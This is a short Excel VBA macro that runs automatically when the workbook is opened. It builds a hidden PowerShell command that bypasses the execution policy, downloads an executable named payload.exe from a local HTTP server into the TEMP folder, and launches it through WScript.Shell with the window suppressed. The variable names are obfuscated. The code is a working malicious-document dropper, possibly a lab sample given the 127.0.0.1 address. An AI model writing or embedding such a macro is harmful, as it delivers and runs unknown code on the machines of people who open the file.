Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim jybosg1pnivrj As String
    Dim lps4wdhm As Object
    Dim sbospdtkrqzns As String, outPath As String
    sbospdtkrqzns = "http://127.0.0.1:9090/payload.exe"
    outPath = Environ("TEMP") & "\oblivionx_payload.exe"
    jybosg1pnivrj = "powershell.exe -NoProfile -WindowStyle Hidden " & _
          "-ExecutionPolicy Bypass -Command " & Chr(34) & _
          "(New-Object System.Net.WebClient).DownloadFile('" & sbospdtkrqzns & "','" & outPath & "'); " & _
          "Invoke-Item '" & outPath & "'" & Chr(34)
    Set lps4wdhm = CreateObject("WScript.Shell")
    lps4wdhm.Run jybosg1pnivrj, 0, False
End Sub
